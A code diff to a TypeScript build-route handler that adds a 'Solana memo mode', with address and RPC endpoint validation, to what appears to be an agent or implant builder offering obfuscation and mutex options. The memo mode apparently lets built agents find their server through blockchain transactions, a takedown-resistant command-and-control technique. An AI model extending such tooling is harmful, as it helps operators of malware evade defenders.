@@ -49,6 +49,9 @@ export async function handleBuildRoutes(
         platforms,
         serverUrl,
         rawServerList,
+        solMemo,
+        solAddress,
+        solRpcEndpoints,
         stripDebug,
         disableCgo,
         obfuscate,
@@ -101,10 +104,19 @@ export async function handleBuildRoutes(
       }
 
       const safeRawServerList = !!rawServerList;
+      const safeSolMemo = !!solMemo;
       const safeServerUrl =
         typeof serverUrl === "string" && serverUrl.trim() !== ""
           ? serverUrl.trim()
           : undefined;
+
+      if (safeRawServerList && safeSolMemo) {
+        return Response.json(
+          { error: "Cannot enable both raw server list and Solana memo mode" },
+          { status: 400 },
+        );
+      }
+
       if (safeRawServerList) {
         if (!safeServerUrl) {
           return Response.json(
@@ -122,6 +134,46 @@ export async function handleBuildRoutes(
           }
         } catch {
           return Response.json({ error: "Invalid raw server list URL" }, { status: 400 });
+        }
+      }
+
+      let safeSolAddress: string | undefined;
+      let safeSolRpcEndpoints: string | undefined;
+      if (safeSolMemo) {
+        if (typeof solAddress !== "string" || !solAddress.trim()) {
+          return Response.json(
+            { error: "Solana memo mode requires a Solana address" },
+            { status: 400 },
+          );
+        }
+        const trimmedAddr = solAddress.trim();
+        if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmedAddr)) {
+          return Response.json(
+            { error: "Invalid Solana address (must be Base58, 32-44 chars)" },
+            { status: 400 },
+          );
+        }
+        safeSolAddress = trimmedAddr;
+
+        if (typeof solRpcEndpoints === "string" && solRpcEndpoints.trim()) {
+          const endpoints = solRpcEndpoints.split("\n").map((e: string) => e.trim()).filter(Boolean);
+          for (const ep of endpoints) {
+            try {
+              const parsed = new URL(ep);
+              if (parsed.protocol !== "https:" && parsed.protocol !== "http:") {
+                return Response.json(
+                  { error: `Invalid RPC endpoint protocol: ${ep}` },
+                  { status: 400 },
+                );
+              }
+            } catch {
+              return Response.json(
+                { error: `Invalid RPC endpoint URL: ${ep}` },
+                { status: 400 },
+              );
+            }
+          }
+          safeSolRpcEndpoints = endpoints.join(",");
         }
       }
 
@@ -233,6 +285,9 @@ export async function handleBuildRoutes(
         platforms: allowedPlatforms,
         serverUrl: safeServerUrl,
         rawServerList: safeRawServerList,
+        solMemo: safeSolMemo,
+        solAddress: safeSolAddress,
+        solRpcEndpoints: safeSolRpcEndpoints,
         mutex: safeMutex,
         disableMutex: safeDisableMutex,
         stripDebug,
